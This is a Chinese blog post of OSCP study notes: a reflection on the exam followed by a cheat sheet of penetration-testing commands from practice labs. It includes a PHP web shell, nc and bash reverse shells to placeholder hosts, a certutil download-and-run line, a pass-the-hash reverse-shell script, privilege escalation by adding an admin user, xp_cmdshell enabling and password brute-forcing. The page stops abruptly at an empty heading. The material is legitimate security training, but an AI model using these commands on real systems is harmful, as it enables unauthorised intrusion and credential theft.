@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":"mac"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: true,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="20年11月中旬，我正式开始了OSCP认证，在这之前也做了一些vulnhub上的靶场，其中的笔记也在博客上发布了，但是跟OSCP相比，那些都还是属于非常简单没有任何难度的。提交材料审核付款过后，官方给的教材PDF是非常有用的，个人觉得可以作为高校的教科书来使用，其中涉及的技术基本涵盖了一个渗透工程师所需要的所有技能，包括主被动信息收集、web漏洞、win&#x2F;linux缓冲区溢出、客户端攻击（包含社工">
+<meta name="keywords" content="OSCP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OSCP总结">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;18&#x2F;OSCP%E6%80%BB%E7%BB%93&#x2F;index.html">
+<meta property="og:site_name" content="LionKing">
+<meta property="og:description" content="20年11月中旬，我正式开始了OSCP认证，在这之前也做了一些vulnhub上的靶场，其中的笔记也在博客上发布了，但是跟OSCP相比，那些都还是属于非常简单没有任何难度的。提交材料审核付款过后，官方给的教材PDF是非常有用的，个人觉得可以作为高校的教科书来使用，其中涉及的技术基本涵盖了一个渗透工程师所需要的所有技能，包括主被动信息收集、web漏洞、win&#x2F;linux缓冲区溢出、客户端攻击（包含社工">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;4wjFT5EtW1R36kD.png">
+<meta property="og:updated_time" content="2021-02-18T11:15:59.285Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;02&#x2F;18&#x2F;4wjFT5EtW1R36kD.png">
+
+<link rel="canonical" href="http://yoursite.com/2021/02/18/OSCP%E6%80%BB%E7%BB%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>OSCP总结 | LionKing</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">LionKing</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">安全小白成长之路</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/02/18/OSCP%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="LionKing">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LionKing">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          OSCP总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-02-18 23:16:29 / 修改时间：19:15:59" itemprop="dateCreated datePublished" datetime="2021-02-18T23:16:29+08:00">2021-02-18</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>20年11月中旬，我正式开始了OSCP认证，在这之前也做了一些vulnhub上的靶场，其中的笔记也在博客上发布了，但是跟OSCP相比，那些都还是属于非常简单没有任何难度的。<br>提交材料审核付款过后，官方给的教材PDF是非常有用的，个人觉得可以作为高校的教科书来使用，其中涉及的技术基本涵盖了一个渗透工程师所需要的所有技能，包括主被动信息收集、web漏洞、win/linux缓冲区溢出、客户端攻击（包含社工）、文件传输及bypass、av bypass、提权、端口转发及隧道、内网域、密码、powershell等各种知识，虽然大家在做渗透的过程中都会用到，但是你绝对想象不到官方的教材有多么的细致及全面。我有时候看PDF都会觉得：卧槽，还有这种东西？ 不得不说这钱是花的非常值得的，光是PDF就受益良多。另外官方的实验靶场也是非常有意思，官方为实验室新手准备的攻击路径手册，其大致就是告诉新人该从哪些机器开始做，官方论坛中会有公开的这个手册前两题的解题过程，跟着帖子走，你会发现满满7页的解题过程居然要注意那么多细节，尽管它还是属于easy难度的题目。官方会从IP着手，教你如何找到内网中的DNS服务器，并且找到目标的机器名（每台机器都会有一个特别的名字，并且这个名字可能是某种提示），以及如何更好的扫描端口等各种信息收集。针对端口，官方会指引你怎么找到这个端口更具体的版本信息，以及是否存在合适的漏洞。看完第一题的解题思路就花了我2天的时间，其中不乏要反复理解官方用意和渗透的思路。这是官方想要教会你的东西。毕竟每一台机器都是不一样的，每一台机器的解决方法都是不一样的。同一套方法不能一直使用下去，那如何在渗透过程中获取思路是至关重要的。<br>常规的机器，你可能花费1天时间就能做完，简单的web题一天也许能做3台。但是实验室中还有很多需要找到“朋友”才能做的机器，这些无非是目标和其他的机器有关联，你可能需要其他机器的账号密码凭证或者需要通过其他机器社工发送恶意文档又或者“朋友”上运行了和目标同样的服务，该服务需要通过溢出才能拿到shell等等。这些都十分的有意思并且做起来也十分的痛苦。但注意细节就是官方一直在教授你的东西，正如真实环境中的渗透一样，任何一个小小的细节也许就是你成功的机会。并且克服困难所带来的成就感会让你信心倍增。<br>我买了3个月的实验室靶场时间，在做了50多题之后预约了考试，当时实验室还有大半个月的时间，我是想着如果第一次没考过，那还有剩余的时间做练习，不用再重新花钱买。本着试一试的心态，加上疯狂的复习和看PDF，一次就过了，运气真好。哈哈哈。不过还是告诫一下，靶场至少做30台，这样才会有50%的几率通过考试。<br>下面是一些做的过程中留下来的笔记，由于官方不允许将实验室靶场的解题过程公开，所以这里就放一下小tips。都是在做题目时留下来的一些需要注意的小东西，都是能在网上找到并且具有详细说明的东西。<br>有进一步想要交流的小伙伴，可以mail我。</p><a id="more"></a>
+<hr>
+<p>免费靶场总结：</p>
+<h6 id="JisCTF："><a href="#JisCTF：" class="headerlink" title="JisCTF："></a>JisCTF：</h6><p>查找允许xxxc用户访问的所有文件的列表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user xxxc -type f 2&gt;&amp;1 | grep -v “Permission” | grep -v “No such”</span><br></pre></td></tr></table></figure>
+<p>一句话简单shell语句：xxxc.php?cmd=whoami</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php if(isset($_REQUEST[‘cmd’]))&#123; echo “&lt;pre&gt;”; $cmd = ($_REQUEST[‘cmd’]); system($cmd); echo “&lt;/pre&gt;”; die; &#125;?&gt;</span><br></pre></td></tr></table></figure>
+<h6 id="Five86-2"><a href="#Five86-2" class="headerlink" title="Five86-2:"></a>Five86-2:</h6><p>wordpress扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url 192.168.1.3 -e u   //爆破用户名</span><br><span class="line">wpscan --url http://192.168.1.3 -U users.txt -P /usr/share/wordlists/rockyou.txt   //爆破密码</span><br></pre></td></tr></table></figure>
+
+<p>获得交互式shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;    //获得交互式shell</span><br><span class="line">python3 -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;    //获得交互式shell</span><br></pre></td></tr></table></figure>
+<p>tcpdump抓网卡流量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timeout 150 tcpdump -w xxx.pcap -i vexxxxxxxcd</span><br></pre></td></tr></table></figure>
+<h6 id="HAwordy"><a href="#HAwordy" class="headerlink" title="HAwordy:"></a>HAwordy:</h6><p>wpscan找插件，然后searchexploit找漏洞，打就完事了<br>提权用的是john解密passwd文件的hash</p>
+<h6 id="lazysysadmin"><a href="#lazysysadmin" class="headerlink" title="lazysysadmin:"></a>lazysysadmin:</h6><p>smbmap是映射权限和文件夹的最佳工具之一</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H xx.xx.xx.xx  //（445端口）</span><br></pre></td></tr></table></figure>
+<p>smbclient是smb连接工具</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //xx.xx.xx.xx/share</span><br></pre></td></tr></table></figure>
+
+<h6 id="GitRoot"><a href="#GitRoot" class="headerlink" title="GitRoot:"></a>GitRoot:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost –u gitroot.vuln -w /usr/share/dirb/wordlists/common.txt（/usr/share/dirb/wordlists/big.txt）| grep 200   //爆破虚拟主机名</span><br><span class="line">find / -name .git 2&gt;/dev/null   //根目录下查找.git文件（或目录）</span><br></pre></td></tr></table></figure>
+<h6 id="powergrid"><a href="#powergrid" class="headerlink" title="powergrid:"></a>powergrid:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -f xx.xx.xx.xx http-get /zmail_path    //爆破类basic认证页面方法</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>官方实验靶场总结：</p>
+<p>nmap快速扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.x.x.x --top-ports 10 --open    //top10</span><br></pre></td></tr></table></figure>
+<p>nikto扫漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host 10.x.x.x</span><br></pre></td></tr></table></figure>
+<p>有配置文件看配置文件，里面可能存在密码</p>
+<p>循环递归扫目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -E -r -u http://xxx.xx.xx.x/</span><br></pre></td></tr></table></figure>
+<p>查看banner</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv ip port (可以加个-C参数,CRLF)</span><br></pre></td></tr></table></figure>
+
+<p>循环查看pop3用户邮件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for user in marcus john mailadmin jenny ryuu joe45; do</span><br><span class="line">    ( echo USER $&#123;user&#125;; sleep 2s; echo PASS abcd; sleep 2s; echo LIST; sleep 2s; echo quit) | nc -nvC 10.x.x.x 110;  done</span><br></pre></td></tr></table></figure>
+<p>pop3(110端口)命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">USER ryuu  //用户名</span><br><span class="line">PASS abcd   //密码</span><br><span class="line">LIST   //列出邮件</span><br><span class="line">RETR 1  //读取邮件顺序</span><br></pre></td></tr></table></figure>
+<p>查看当前环境</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $SHELL</span><br></pre></td></tr></table></figure>
+<p>linux受限shell环境bypass</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.exploit-db.com/papers/44592/</span><br></pre></td></tr></table></figure>
+<p>searchsploit操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -u   //更新</span><br><span class="line">searchsploit -x num  //显示对应文本</span><br><span class="line">searchsploit -w num  //显示对应链接</span><br><span class="line">searchsploit -p num   //完整显示（文本位置、URL、名称）非常好用的功能！</span><br><span class="line">searchsploit -m num   //顺便把文件复制出来！</span><br></pre></td></tr></table></figure>
+<p>cat操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat -n xxx.py   //标准输出内容</span><br></pre></td></tr></table></figure>
+<p>nmap扫描漏洞（-A很重要，也许能看到东西）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -sV -Pn --open -T4 --script vuln -p- 10.x.x.x --dns-server 10.x.x.x   //扫描IP漏洞(加了个dns-server)</span><br><span class="line">nmap --script smb-vuln* -p 135,139,445,1025 10.x.x.x   //扫描17010漏洞，主要看445</span><br></pre></td></tr></table></figure>
+<p>windows在c盘查找文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir /a /s /b c:\&quot;proof.txt&quot;   //查找proof.txt文件(/a表示查看隐藏文件)</span><br><span class="line">type proof.txt    //显示文件内容</span><br><span class="line">type &quot;C:\.....proof.txt&quot;</span><br></pre></td></tr></table></figure>
+<p>linux查找文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name proof.txt 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>找端口服务很重要！要仔细！</p>
+<p>循环查找RDNS域名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for ip in $(seq 0 255); do host 10.x.x.$ip 10.x.x.x; done | grep -i &quot;name&quot;  //通过10.x.x.x DNS服务器反向查找C端内IP对应域名</span><br></pre></td></tr></table></figure>
+<p>ftp未授权扫描！！！<br>windows nc反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">本地：nc -nvlp 65530 </span><br><span class="line">远程 nc xx.xx.xx.xx 65530 -e c:\windows\system32\cmd.exe    //windows</span><br><span class="line">远程 nc xx.xx.xx.xx 65530 -e /bin/bash   //linux</span><br></pre></td></tr></table></figure>
+<p>吐司webshell烂土豆Juicypotato提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -p &quot;net user admin admin /add&quot;  //net localgroup administrators admin /add    //建用户</span><br></pre></td></tr></table></figure>
+
+<p>msf扫描smb版本模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure>
+<p>查找samba/smb版本命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p139,445 10.x.x.x</span><br></pre></td></tr></table></figure>
+<p>找到对应版本的漏洞，msf直接打就完了</p>
+<p>学习手工注入oralce</p>
+<p>google很重要！<br>msf自动注入进程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_nonx_tcp    //这里需要改成对应的</span><br><span class="line">set ExitOnSession false</span><br><span class="line">set AutoRunScript post/windows/manage/migrate</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+
+<p>查看samba/smb共享</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.x.x.x    //查看共享目录（不一定需要445,139也可以）</span><br><span class="line">smbclient //10.x.x.x/home   //查看文件</span><br></pre></td></tr></table></figure>
+<p>看到home目录就要记得有可能是用户名！！！<br>查看文件前和后几行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">head -n 10 xxx.txt   //查看re.txt前10行</span><br><span class="line">tail -n 10 xxx.txt   //查看re.txt后10行</span><br><span class="line">tail -f xxx.txt   //持续显示文件内容</span><br></pre></td></tr></table></figure>
+<p>将内容追加至文件结尾</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;whoami &gt; /root/who.txt&quot; &gt;&gt; cleanup.sh</span><br></pre></td></tr></table></figure>
+<p>suid提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>从页面提取字典</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://xx.xx.xx.xx/index.php -w dict.txt    //从页面提取文字到字典，-w保存文件</span><br></pre></td></tr></table></figure>
+<p>记得查看页面源码！！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;src=/xxxx/&quot;  //也许这就是后台目录啊！！！！</span><br><span class="line">用linkfinder也不错</span><br></pre></td></tr></table></figure>
+<p>发现的程序名称，缩写全写都要在searchsploit里面找找<br>获取交互式shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;    //获得交互式shell</span><br><span class="line">python3 -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;    //获得交互式shell</span><br><span class="line">bash -i     //也许可以</span><br></pre></td></tr></table></figure>
+<p>提权文章看这：<a href="https://xz.aliyun.com/t/7924#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/7924#toc-1</a></p>
+<p>nmap的脚本很重要，另外对陌生程序的google也很重要</p>
+<p>NC反弹shell,看上面xx机器，一定要加-e参数！！！<br>用的webshell记得看下版本是不是对应机器可用的，oscp机器很老！！！<br>google “windows xp sp1 privesc”提的权</p>
+<p>看源码！数据库连接凭证！</p>
+<p>suid 使用方式“google”<br>bypass disable func </p>
+<p>生成linux用户秘钥</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt data 123</span><br></pre></td></tr></table></figure>
+
+<p>echo写入覆盖是&gt; 追加是 &gt;&gt;<br>lse提权脚本真不错！</p>
+<p>windows上传文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c &quot;certutil.exe -urlcache -split -f http://1.1.1.1/test.exe &amp;test.exe &amp;del test.exe&quot;</span><br></pre></td></tr></table></figure>
+<p>pth使用（当拥有一个用户的凭证后）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//创建ps1脚本</span><br><span class="line">$secpasswd = ConvertTo-SecureString &quot;&lt;password&gt;&quot; -AsPlainText -Force</span><br><span class="line">$mycreds = New-Object System.Management.Automation.PSCredential (&quot;&lt;user&gt;&quot;, $secpasswd)</span><br><span class="line">$computer = &quot;&lt;hostname&gt;&quot;</span><br><span class="line">[System.Diagnostics.Process]::Start(&quot;C:\users\public\nc.exe&quot;,&quot;&lt;attacker_ip&gt; 4444 -e cmd.exe&quot;, $mycreds.Username, $mycreds.Password, $computer)</span><br><span class="line">//cmd终端下执行即可</span><br><span class="line">powershell -ExecutionPolicy Bypass -File c:\users\public\r.ps1</span><br></pre></td></tr></table></figure>
+<p>windows提权文章:<a href="https://guif.re/windowseop" target="_blank" rel="noopener">https://guif.re/windowseop</a></p>
+<p>psexec:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ pth-winexe -U offsec%aad3b43xxxx:2892d26cdf84d7a70xxxx //10.x.x.x cmd  </span><br><span class="line">E_md4hash wrapper called.  </span><br><span class="line">HASH PASS: Substituting user supplied NTLM HASH...  </span><br><span class="line">Microsoft Windows [Version 10.0.16299.309]  </span><br><span class="line">(c) 2017 Microsoft Corporation. All rights reserved.  </span><br><span class="line">C:\Windows\system32</span><br></pre></td></tr></table></figure>
+<p>linux查找全局可写文件、目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable -type d 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>vim 使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">:set number   //显示行号</span><br><span class="line">/关键字   //向下查找</span><br><span class="line">?关键字   //向上查找</span><br><span class="line">输入关键字后按回车，按n跳到下一个，shift+n上一个</span><br></pre></td></tr></table></figure>
+
+<p>windows找端口运行的程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr 2233  //找端口对应的PID</span><br><span class="line">tasklist | findstr PID     //找PID对应的程序名</span><br><span class="line">dir /s xxx.exe   //找文件位置</span><br></pre></td></tr></table></figure>
+<p>中文windows反弹shell后乱码问题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001   //在反弹的shell中输入</span><br></pre></td></tr></table></figure>
+
+<p>docker逃逸：<a href="https://gtfobins.github.io/gtfobins/docker/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/docker/</a><br>rbash逃逸：<a href="https://xz.aliyun.com/t/7642#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/7642#toc-3</a></p>
+<p>OSCP笔记：<a href="https://fareedfauzi.gitbook.io/oscp-notes/" target="_blank" rel="noopener">https://fareedfauzi.gitbook.io/oscp-notes/</a><br>sqsh使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqsh -U 用户名 -P 密码 -S 服务器地址    //sqsh连接mssql</span><br></pre></td></tr></table></figure>
+
+<p>windows短文件名表示法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /x  //可以看到短文件名</span><br></pre></td></tr></table></figure>
+<p>mssql的hash文件位置及解密：<a href="https://blog.xpnsec.com/extracting-master-mdf-hashes/" target="_blank" rel="noopener">https://blog.xpnsec.com/extracting-master-mdf-hashes/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\DATA\master.mdf   //该文件可以解密</span><br><span class="line">C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Backup\master.mdf    //备份后位置</span><br></pre></td></tr></table></figure>
+<p>开启mssql的xp_cmdshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">开启开启xp_cmdshell</span><br><span class="line">exec sp_configure &apos;show advanced options&apos;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">exec sp_configure &apos;xp_cmdshell&apos;,1;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure>
+<p>查看smb版本，实用！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1st ：ngrep -i -d tap0 &apos;s.?a.?m.?b.?a.*[[:digit:]]&apos; port 139   </span><br><span class="line">2nd ：echo exit | smbclient -L [IP]</span><br></pre></td></tr></table></figure>
+
+<p>linux反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>查看网卡信息：</p>
